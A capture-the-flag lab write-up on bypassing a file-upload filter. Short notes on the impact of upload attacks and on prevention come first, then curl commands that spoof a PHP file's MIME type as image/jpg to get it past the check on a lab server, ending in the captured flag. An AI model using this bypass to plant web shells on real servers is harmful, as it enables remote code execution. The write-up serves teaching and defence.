# Upload bypass

## Impact of a File Upload Attack

- **Phishing attacks** :Hackers can trick users with malicious scripts to gain access to sensitive data.

- **Remote code execution** : Attackers leverage file upload commands to upload a web shell that allows them to execute arbitrary commands on the application server.

## Preventing file upload vulnerability

- **Validate File Formats and Extensions** : Make sure you check the file extension of uploaded files against a white-list of permitted file types. Do this on the server-side, since client-side checks can be circumvented.

- **File upload validation** : When validating file uploads, use trusted validation frameworks that address all potential gaps that attackers could exploit

- **File name restrictions** : Once a file has been uploaded, remove all potentially dangerous characters, including unicode characters and special characters, to prevent injection attacks. Changing the uploaded file’s name is also recommended to prevent directory path exploits.

- **File size restrictions**: Enforce a file size limit and a maximum number of files that can be uploaded to keep attackers from flooding file storage.

## Attack scenario

In ?page=upload page we are asket to upload an image so lets try to upload a malicious file first i tried a file .php and got this response

> Your image was not uploaded.

then I tried next .php.jpg the response was

> /tmp/file.php.jpg succesfully uploaded.

But no flag so there is another way to do it lets try with curl 

> -X to specify the method type in our case its POST

> -F specify data to send (files) example email=blabla@blabla.bla the email is the name of the input

In our case there is 2 input the first one is uploaded that contain the data then Upload to submit

> curl -i -X POST -F "uploaded=@/Users/oel-ouar/Desktop/file.php" -F Upload=Upload http://ipaddress/?page=upload

We got the same response now lets try to change the mime type of the file

> curl -i -X POST -F "uploaded=@/Users/oel-ouar/Desktop/file.php;type=image/jpg" -F Upload=Upload http://10.12.177.243/?page=upload

Worked !

> <h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2>
